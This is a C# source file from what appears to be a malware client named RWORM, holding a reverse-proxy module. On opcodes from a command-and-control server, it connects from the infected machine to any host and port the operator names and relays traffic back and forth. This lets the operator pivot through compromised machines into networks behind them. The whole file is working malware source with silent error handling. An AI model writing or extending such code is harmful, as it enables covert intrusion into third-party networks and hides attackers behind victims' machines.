using System;
using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace RWORM.Client.Modules
{
    public class ReverseProxyManager : IDisposable
    {
        private readonly Func<byte, int, byte[], Task> _sendPacket;
        private readonly ConcurrentDictionary<int, TcpClient> _connections = new();
        private bool _active = false;

        public ReverseProxyManager(Func<byte, int, byte[], Task> sendPacket)
        {
            _sendPacket = sendPacket;
        }

        public void Start()
        {
            _active = true;
        }

        public void Stop()
        {
            _active = false;
            foreach (var kvp in _connections)
            {
                try { kvp.Value.Close(); } catch { }
            }
            _connections.Clear();
        }

        public void HandlePacket(byte opcode, int channelId, byte[] payload)
        {
            if (opcode == 0x90) // PROXY_START: connect to target host:port
            {
                // payload: "host:port"
                string target = System.Text.Encoding.UTF8.GetString(payload).Trim();
                int colon = target.LastIndexOf(':');
                if (colon > 0 && int.TryParse(target.Substring(colon + 1), out int port))
                {
                    string host = target.Substring(0, colon);
                    Task.Run(() => ConnectTarget(channelId, host, port));
                }
            }
            else if (opcode == 0x91) // PROXY_DATA: send data to connected TCP socket
            {
                if (_connections.TryGetValue(channelId, out var tcp) && tcp.Connected)
                {
                    try
                    {
                        var stream = tcp.GetStream();
                        stream.Write(payload, 0, payload.Length);
                        stream.Flush();
                    }
                    catch
                    {
                        CloseChannel(channelId);
                    }
                }
            }
            else if (opcode == 0x92) // PROXY_STOP: close channel
            {
                CloseChannel(channelId);
            }
        }

        private async Task ConnectTarget(int channelId, string host, int port)
        {
            try
            {
                var tcp = new TcpClient();
                await tcp.ConnectAsync(host, port);
                _connections[channelId] = tcp;

                // notify server connection open (empty data on channel)
                await _sendPacket(0x90, channelId, Array.Empty<byte>());

                // Start pump from target back to C2
                byte[] buffer = new byte[8192];
                var stream = tcp.GetStream();
                while (_active && tcp.Connected)
                {
                    int read = await stream.ReadAsync(buffer, 0, buffer.Length);
                    if (read <= 0) break;

                    byte[] chunk = new byte[read];
                    Buffer.BlockCopy(buffer, 0, chunk, 0, read);
                    await _sendPacket(0x91, channelId, chunk);
                }
            }
            catch { }
            finally
            {
                CloseChannel(channelId);
            }
        }

        private void CloseChannel(int channelId)
        {
            if (_connections.TryRemove(channelId, out var tcp))
            {
                try { tcp.Close(); } catch { }
            }
            try
            {
                _ = _sendPacket(0x92, channelId, Array.Empty<byte>());
            }
            catch { }
        }

        public void Dispose() => Stop();
    }
}
